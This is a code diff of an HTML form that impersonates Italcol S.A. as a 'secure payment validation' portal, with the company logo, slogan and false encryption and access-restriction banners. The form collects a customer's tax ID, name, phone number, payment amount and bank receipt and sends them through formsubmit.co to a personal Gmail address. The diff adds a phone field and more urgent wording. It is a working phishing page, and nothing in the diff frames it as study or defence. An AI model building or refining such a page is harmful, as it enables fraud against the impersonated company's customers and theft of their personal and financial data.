@@ -7,58 +7,64 @@
     <style>
         :root { --naranja: #ff6600; --gris-fondo: #f4f7f6; }
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: var(--gris-fondo); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .form-card { background: white; border-radius: 12px; width: 100%; max-width: 450px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); border-top: 6px solid var(--naranja); padding: 40px; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .logo { width: 180px; height: auto; margin-bottom: 10px; }
-        .slogan { color: var(--naranja); font-weight: 700; font-size: 12px; text-transform: uppercase; }
-        .lock-icon { color: #28a745; font-size: 11px; margin-top: 5px; font-weight: bold; }
-        label { display: block; margin-top: 15px; font-weight: 600; font-size: 13px; color: #555; }
-        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .file-box { background: #fffcf9; border: 2px dashed #ff660044; padding: 20px; border-radius: 8px; text-align: center; margin-top: 20px; }
-        .btn-send { width: 100%; background: var(--naranja); color: white; border: none; padding: 15px; margin-top: 25px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .footer { text-align: center; font-size: 10px; color: #bbb; margin-top: 30px; line-height: 1.4; }
+        .form-card { background: white; border-radius: 12px; width: 100%; max-width: 450px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); border-top: 8px solid var(--naranja); padding: 40px; position: relative; }
+        .header { text-align: center; margin-bottom: 25px; }
+        
+        /* Logo con respaldo si el principal falla */
+        .logo { width: 200px; height: auto; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto; }
+        
+        .slogan { color: var(--naranja); font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
+        .security-banner { background: #e8f5e9; color: #2e7d32; font-size: 11px; padding: 8px; border-radius: 5px; margin-top: 15px; font-weight: bold; border: 1px solid #c8e6c9; }
+        
+        label { display: block; margin-top: 15px; font-weight: 600; font-size: 13px; color: #444; }
+        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
+        input:focus { outline: none; border-color: var(--naranja); box-shadow: 0 0 5px rgba(255,102,0,0.2); }
+
+        .file-box { background: #fffcf9; border: 2px dashed #ff660044; padding: 20px; border-radius: 10px; text-align: center; margin-top: 20px; }
+        .btn-send { width: 100%; background: var(--naranja); color: white; border: none; padding: 16px; margin-top: 25px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn-send:hover { background: #e65c00; transform: translateY(-1px); }
+
+        .footer { text-align: center; font-size: 10px; color: #aaa; margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="form-card">
     <div class="header">
-        <img src="https://italcol.com/wp-content/uploads/2021/01/logo-italcol.png" alt="Italcol" class="logo">
+        <img src="https://italcol.com/wp-content/themes/italcol/img/logo.png" alt="Italcol S.A." class="logo">
         <div class="slogan">Su aliado para crecer</div>
-        <div class="lock-icon">🔒 CONEXIÓN CIFRADA CON PROTOCOLO TLS 1.3</div>
+        <div class="security-banner">🔒 BARRERA DE SEGURIDAD ACTIVA: CIFRADO TLS 1.3</div>
     </div>
 
     <form action="https://formsubmit.co/ed.mauricio99@gmail.com" method="POST" enctype="multipart/form-data">
         
-        <input type="text" name="_honey" style="display:none">
-
-        <input type="hidden" name="_captcha" value="true">
-
+        <input type="text" name="_honey" style="display:none"> <input type="hidden" name="_captcha" value="true"> <input type="hidden" name="_subject" value="URGENTE: VALIDACIÓN DE PAGO RECIBIDA">
         <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_subject" value="REPORTE DE PAGO SEGURO - ITALCOL">
-        
-        <label>NIT O CÉDULA DEL CLIENTE</label>
-        <input type="text" name="NIT_CLIENTE" placeholder="Verifique el número" required>
 
-        <label>RAZÓN SOCIAL / NOMBRE</label>
+        <label>NIT O IDENTIFICACIÓN DEL CLIENTE</label>
+        <input type="text" name="NIT_CLIENTE" required placeholder="Ingrese número sin puntos">
+
+        <label>NOMBRE O RAZÓN SOCIAL</label>
         <input type="text" name="NOMBRE_CLIENTE" required>
 
-        <label>VALOR DE LA TRANSFERENCIA (COP)</label>
-        <input type="number" name="VALOR_PAGO" required>
+        <label>CELULAR REGISTRADO</label>
+        <input type="tel" name="CONTACTO" required>
+
+        <label>VALOR DE LA OPERACIÓN (COP)</label>
+        <input type="number" name="MONTO_PAGO" required placeholder="$">
 
         <div class="file-box">
-            <strong>ADJUNTAR COMPROBANTE ORIGINAL</strong>
-            <p>Solo archivos PDF, JPG o PNG</p>
+            <strong>ADJUNTAR COMPROBANTE BANCARIO</strong>
+            <p>Formatos aceptados: PDF, JPG o PNG</p>
             <input type="file" name="attachment" accept="image/*,.pdf" required>
         </div>
 
-        <button type="submit" class="btn-send">ENVIAR VALIDACIÓN SEGURA</button>
+        <button type="submit" class="btn-send">EJECUTAR ENVÍO SEGURO</button>
     </form>
 
     <div class="footer">
-        ESTE PORTAL UTILIZA CIFRADO PUNTO A PUNTO.<br>
-        PROHIBIDO EL ACCESO A PERSONAL NO AUTORIZADO.<br>
-        ITALCOL S.A. © 2026
+        ACCESO RESTRINGIDO - USO ADMINISTRATIVO<br>
+        ITALCOL S.A. © 2026 - PROTECCIÓN DE DATOS ASEGURADA
     </div>
 </div>
 
